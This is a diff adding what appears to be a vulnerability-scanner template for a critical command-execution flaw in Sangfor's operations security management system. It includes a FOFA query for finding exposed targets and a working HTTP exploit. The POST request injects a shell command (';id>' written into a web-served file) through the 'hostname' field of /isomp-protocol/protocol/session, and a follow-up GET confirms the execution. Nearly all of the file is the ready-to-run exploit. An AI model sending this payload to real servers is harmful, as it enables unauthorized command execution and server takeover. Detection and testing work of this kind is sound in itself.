@@ -1,0 +1,38 @@
+## id: VEID-2026-11120
+## name: 深信服运维安全管理系统protoco-session-命令执行
+## author: hack007x
+## severity: critical
+## tags: veid,rce,veid2026
+## description: 深信服运维安全管理系统protoco-session-命令执行，攻击者可执行任意命令导致服务器被控。
+## affects: 深信服运维安全管理系统
+## fofa-query: body="/fort/login" && header="FORTSESSIONID"
+## verification: true
+
+
+
+POST /isomp-protocol/protocol/session HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Access_token: null
+Connection: keep-alive
+
+hostname=;id>/usr/local/tomcat/webapps/fort/trust/js/veil.txt;&port=11&protocol=x11&resolution=1*11&session_path=1&sid=1
+
+
+#@ matcher: status_code == 200
+
+
+---
+
+GET /fort/trust/js/veil.txt HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: body contains "uid=" && body contains "gid=" && body contains "groups="
+#@ matcher: status_code == 200
+
+
+# @VEIL-STAMP: d16c7e9355bc1e3db2913be3d3bf67c63d4b06614eac02fd4579da3ca340fe26
